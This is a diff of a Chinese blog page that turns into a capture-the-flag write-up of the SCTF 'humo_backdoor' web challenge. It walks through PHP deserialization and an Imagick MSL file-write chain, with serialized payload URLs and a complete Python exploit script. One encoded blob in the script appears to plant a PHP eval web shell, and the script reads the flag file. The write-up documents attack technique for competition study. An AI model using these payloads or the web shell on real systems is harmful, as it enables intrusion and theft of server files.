@@ -6,13 +6,17 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives: 2023/6 | N1_ght的主页</title>
+  <title>sctf_web_humo_backdoor | N1_ght的主页</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="N1_ght的主页">
-<meta property="og:url" content="http://example.com/archives/2023/06/index.html">
+  <meta name="description" content="humo_backdoor这次我们从dockerfile开始分析 123456789101112131415FROM php:7.4-apacheCOPY html &#x2F;var&#x2F;www&#x2F;htmlCOPY flag &#x2F;flagRUN sed -i &amp;#x27;s#http:&#x2F;&#x2F;deb.debian.org#http:&#x2F;&#x2F;mirrors.aliyun.com#g&amp;#x27; &#x2F;etc&#x2F;apt&#x2F;sourc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sctf_web_humo_backdoor">
+<meta property="og:url" content="http://example.com/2023/06/22/sctf_web_humo_backdoor/index.html">
 <meta property="og:site_name" content="N1_ght的主页">
+<meta property="og:description" content="humo_backdoor这次我们从dockerfile开始分析 123456789101112131415FROM php:7.4-apacheCOPY html &#x2F;var&#x2F;www&#x2F;htmlCOPY flag &#x2F;flagRUN sed -i &amp;#x27;s#http:&#x2F;&#x2F;deb.debian.org#http:&#x2F;&#x2F;mirrors.aliyun.com#g&amp;#x27; &#x2F;etc&#x2F;apt&#x2F;sourc">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-06-22T07:47:40.000Z">
+<meta property="article:modified_time" content="2023-06-22T07:47:42.647Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -152,130 +156,161 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-sctf_web_humo_backdoor" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      sctf_web_humo_backdoor
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2023" class="archive-year">2023</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2023/06/22/sctf_web_humo_backdoor/" class="archive-article-date">
+
+        
+        <a href="/2023/06/22/sctf_web_humo_backdoor/" class="archive-article-date">
   	<time datetime="2023-06-22T07:47:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-06-22</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2023/06/22/sctf_web_humo_backdoor/">sctf_web_humo_backdoor</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="humo-backdoor"><a href="#humo-backdoor" class="headerlink" title="humo_backdoor"></a>humo_backdoor</h1><p>这次我们从dockerfile开始分析</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">FROM php:<span class="number">7.4</span>-apache</span><br><span class="line"></span><br><span class="line">COPY html /<span class="keyword">var</span>/www/html</span><br><span class="line"></span><br><span class="line">COPY flag /flag</span><br><span class="line"></span><br><span class="line">RUN sed -i <span class="string">&#x27;s#http://deb.debian.org#http://mirrors.aliyun.com#g&#x27;</span> /etc/apt/sources.list &amp;&amp;\</span><br><span class="line">    apt-get update &amp;&amp; apt-get install -y libmagickwand-dev --no-install-recommends</span><br><span class="line"></span><br><span class="line">RUN pecl install imagick &amp;&amp; docker-php-ext-enable imagick &amp;&amp;\</span><br><span class="line">    chmod -R <span class="number">555</span> /<span class="keyword">var</span>/www/html &amp;&amp;\</span><br><span class="line">    chmod <span class="number">444</span> /flag</span><br><span class="line"></span><br><span class="line">EXPOSE <span class="number">80</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>出题人选用了php:7.4-apache为基础镜像<br>将当前目录下html文件夹，复制到了&#x2F;var&#x2F;www&#x2F;html<br>将当前目录下的flag，复制到了&#x2F;flag<br>然后进行了换源安装了，libmagickwand-dev，imagick，对flag进行了权限限制所有用户都不能覆盖掉flag<br>开启了80端口<br>接下来就是看他的代码了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">error_reporting</span><span class="params">(<span class="number">0</span>)</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, __DIR__.<span class="string">&quot;:/tmp&quot;</span>);</span><br><span class="line">define(<span class="string">&quot;FUNC_LIST&quot;</span>, get_defined_functions());</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">fumo_backdoor</span> &#123;</span><br><span class="line">    <span class="type">public</span> <span class="variable">$path</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">public</span> <span class="variable">$argv</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">public</span> <span class="variable">$func</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">public</span> <span class="variable">$class</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__sleep</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            file_exists($<span class="built_in">this</span>-&gt;path) &amp;&amp; </span><br><span class="line">            preg_match_all(<span class="string">&#x27;/[flag]/m&#x27;</span>, $<span class="built_in">this</span>-&gt;path) === <span class="number">0</span></span><br><span class="line">        ) &#123;</span><br><span class="line">            readfile($<span class="built_in">this</span>-&gt;path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__wakeup</span><span class="params">()</span> &#123;</span><br><span class="line">        $func = $<span class="built_in">this</span>-&gt;func;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            is_string($func) &amp;&amp; </span><br><span class="line">            in_array($func, FUNC_LIST[<span class="string">&quot;internal&quot;</span>])</span><br><span class="line">        ) &#123;</span><br><span class="line">            call_user_func($func);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $argv = $<span class="built_in">this</span>-&gt;argv;</span><br><span class="line">            $class = $<span class="built_in">this</span>-&gt;class;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">$class</span>($argv);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cmd = $_REQUEST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">$data = $_REQUEST[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> ($cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;unserialze&#x27;</span>:</span><br><span class="line">        unserialize($data);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;rm&#x27;</span>:</span><br><span class="line">        system(<span class="string">&quot;rm -rf /tmp 2&gt;/dev/null&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以看出来call_user_func($func);和new $class($argv);是可控的，call_user_func是可以进行查看phpinfo的<br>至于方法就是改一下func的值，序列化<br><a target="_blank" rel="noopener" href="http://182.92.6.230:18080/?data=O:13:%22fumo_backdoor%22:4:%7Bs:4:%22path%22;N;s:4:%22argv%22;N;s:4:%22func%22;s:7:%22phpinfo%22;s:5:%22class%22;N;%7D&cmd=unserialze">http://182.92.6.230:18080/?data=O:13:%22fumo_backdoor%22:4:{s:4:%22path%22;N;s:4:%22argv%22;N;s:4:%22func%22;s:7:%22phpinfo%22;s:5:%22class%22;N;}&amp;cmd&#x3D;unserialze</a><br>看到了imagick插件<br><a target="_blank" rel="noopener" href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/</a><br>题目限制了我们使用原生类进行攻击，在根据dockerfile确定需要利用imageick的特性进行攻击<br>imagick类可以利用特性在临时文件写如session文件，在通过session_start函数进行session反序列化<br>生成一个sess_bcbcbc的文件，里面包含反序列化的内容<br><a target="_blank" rel="noopener" href="http://182.92.6.230:18080/?data=O:13:%22fumo_backdoor%22:4:%7Bs:4:%22path%22;N;s:4:%22argv%22;N;s:4:%22func%22;s:13:%22session_start%22;s:5:%22class%22;N;%7D&cmd=unserialze">http://182.92.6.230:18080/?data=O:13:%22fumo_backdoor%22:4:{s:4:%22path%22;N;s:4:%22argv%22;N;s:4:%22func%22;s:13:%22session_start%22;s:5:%22class%22;N;}&amp;cmd=unserialze</a><br>session_start的时候cookie设置为PHPSESSID&#x3D;bcbcbc这样就可以反序列化进入readfile函数<br>mvg复制flag到sess_sdsdsd里面<br>然后通过反序列化读取文件<br>exp.py脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ATTACK_HOST = <span class="string">&quot;http://182.92.6.230:18080&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;unserialze&quot;</span>, <span class="string">&quot;data&quot;</span>: base64.b64decode(<span class="string">&quot;TzoxMzoiZnVtb19iYWNrZG9vciI6NDp7czo0OiJwYXRoIjtOO3M6NDoiYXJndiI7czoxNzoidmlkOm1zbDovdG1wL3BocCoiO3M6NToiY2xhc3MiO3M6NzoiaW1hZ2ljayI7czo0OiJmdW5jIjtiOjA7fQ==&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_phpinfo</span>():</span><br><span class="line">    phpcode = <span class="string">&#x27;?data=O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;N;s:4:&quot;func&quot;;s:7:&quot;phpinfo&quot;;s:5:&quot;class&quot;;N;&#125;&amp;cmd=unserialze&#x27;</span></span><br><span class="line">    phpcode_host = ATTACK_HOST + phpcode</span><br><span class="line">    <span class="built_in">print</span>(requests.get(phpcode_host).text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rm</span>():</span><br><span class="line">    r=requests.get(ATTACK_HOST+<span class="string">&quot;?cmd=rm&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> r.status_code==<span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;tmp文件清除成功&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;清除失败&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_imagick</span>():</span><br><span class="line">    base64_str = <span class="string">&quot;UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw/cGhwIGV2YWwoJF9HRVRbMV0pOz8+fE86MTM6ImZ1bW9fYmFja2Rvb3IiOjQ6e3M6NDoicGF0aCI7czoxNjoiL3RtcC9zZXNzX3Nkc2RzZCI7czo0OiJhcmd2IjtOO3M6NDoiZnVuYyI7TjtzOjU6ImNsYXNzIjtOO30K&quot;</span></span><br><span class="line">    upload_imagick = <span class="string">f&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string">    &lt;image&gt;</span></span><br><span class="line"><span class="string">    &lt;read filename=&quot;inline:data://image/x-portable-anymap;base64,<span class="subst">&#123;base64_str&#125;</span>&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;write filename=&quot;/tmp/sess_bcbcbc&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;/image&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    r=requests.post(ATTACK_HOST,files=&#123;<span class="string">&quot;swarm&quot;</span>:(<span class="string">&quot;swarm.msl&quot;</span>,upload_imagick)&#125;,data=data)</span><br><span class="line">    <span class="built_in">print</span>(r.status_code)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">move_flag</span>():</span><br><span class="line">    move_flag = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;image&gt;</span></span><br><span class="line"><span class="string">&lt;read filename=&quot;mvg:/flag&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;write filename=&quot;/tmp/sess_sdsdsd&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/image&gt;&quot;&quot;&quot;</span></span><br><span class="line">    files = &#123;<span class="string">&quot;swarm&quot;</span>:(<span class="string">&quot;swarm.msi&quot;</span>,move_flag)&#125;</span><br><span class="line">    r=requests.post(ATTACK_HOST,files=files,data=data)</span><br><span class="line">    <span class="built_in">print</span>(r.status_code)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    get_flag=ATTACK_HOST+<span class="string">&#x27;?data=O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;N;s:4:&quot;func&quot;;s:13:&quot;session_start&quot;;s:5:&quot;class&quot;;N;&#125;&amp;cmd=unserialze&#x27;</span></span><br><span class="line">    r=requests.get(get_flag,cookies=&#123;<span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;bcbcbc&quot;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">rm()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;稍等两s: 上传imagick代码生成sess_bcbcbc&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">upload_imagick()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;稍等两s: 上传imagick代码将/flag复制为/tmp/sess_sdsdsd&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">move_flag()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;稍等两s: 请求session_start进行session反序列化进行readfile(&quot;/tmp/sess_sdsdsd&quot;)，获取flag: &#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">get_flag()</span><br><span class="line"><span class="comment">#如果没有看见flag请多次运行</span></span><br></pre></td></tr></table></figure>
 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2023/06/22/sctf_web_humo_backdoor/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2023/06/22/sctf_web_pypy_/" class="archive-article-date">
-  	<time datetime="2023-06-22T07:47:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-06-22</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2023/06/22/sctf_web_pypy_/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">sctf_web_pypy?</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2023/06/22/sctf_web_pypy_/">sctf_web_pypy?</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2023/06/15/servlet%E5%86%85%E5%AD%98%E9%A9%AC/" class="archive-article-date">
-  	<time datetime="2023-06-15T14:42:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-06-15</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2023/06/15/servlet%E5%86%85%E5%AD%98%E9%A9%AC/">servlet内存马</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2023/06/15/flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/" class="archive-article-date">
-  	<time datetime="2023-06-15T14:40:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-06-15</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2023/06/15/flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">flask内存马</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -298,8 +333,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
